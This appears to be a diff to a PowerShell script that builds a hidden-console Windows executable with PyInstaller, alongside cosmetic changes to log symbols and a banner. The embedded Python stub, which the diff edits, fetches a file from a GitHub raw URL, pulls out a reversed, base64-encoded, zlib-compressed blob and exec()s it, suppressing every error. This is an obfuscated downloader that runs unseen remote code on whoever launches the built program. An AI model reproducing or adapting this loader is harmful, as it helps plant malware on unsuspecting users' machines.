@@ -15,11 +15,11 @@ function Log {
     param([string]$Type, [string]$Text)
     $time = (Get-Date).ToString("HH:mm:ss")
     switch ($Type) {
-        "error"   { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "✖ $Text" -ForegroundColor Red }
-        "warning" { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "⚠ $Text" -ForegroundColor Yellow }
-        "success" { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "✔ $Text" -ForegroundColor Green }
-        "step"    { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "➜ $Text" -ForegroundColor Cyan }
-        default   { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "ℹ $Text" -ForegroundColor White }
+        "error"   { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "[X] $Text" -ForegroundColor Red }
+        "warning" { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "[!] $Text" -ForegroundColor Yellow }
+        "success" { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "[+] $Text" -ForegroundColor Green }
+        "step"    { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "[>] $Text" -ForegroundColor Cyan }
+        default   { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "[i] $Text" -ForegroundColor White }
     }
 }
 
@@ -111,6 +111,7 @@ if (Test-Path -LiteralPath $ExePath) {
 New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
+# Fixed Regex: matches b'...' without requiring the preceding text
 $stubBody = @"
 import urllib.request, base64, zlib, re, sys
 url = 'https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py'
@@ -120,7 +121,7 @@ try:
     p = re.search(r"b'([^']+)'", s).group(1)
     exec(zlib.decompress(base64.b64decode(p[::-1])).decode())
 except Exception:
-    sys.exit(0)
+    pass
 "@
 Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
 
@@ -178,7 +179,6 @@ except Exception as e:
 
 Log step "Freezing executable..."
 
-# Added --noconsole to prevent Tkinter popups from showing
 $pyiArgs = @(
     "-m", "PyInstaller",
     "--onefile",
@@ -211,9 +211,9 @@ if (-not $KeepBuild) {
 }
 
 Write-Host ""
-Write-Host "  ┌────────────────────────────────────────────────────────┐" -ForegroundColor DarkGray
-Write-Host "  │  Build Complete!                                       │" -ForegroundColor DarkGray
-Write-Host "  └────────────────────────────────────────────────────────┘" -ForegroundColor DarkGray
+Write-Host "  +--------------------------------------------------------+" -ForegroundColor DarkGray
+Write-Host "  |  Build Complete!                                       |" -ForegroundColor DarkGray
+Write-Host "  +--------------------------------------------------------+" -ForegroundColor DarkGray
 Log success "Executable compiled successfully."
 Log info "Output: $ExePath"
 Log info "Target Architecture: Windows $Arch"
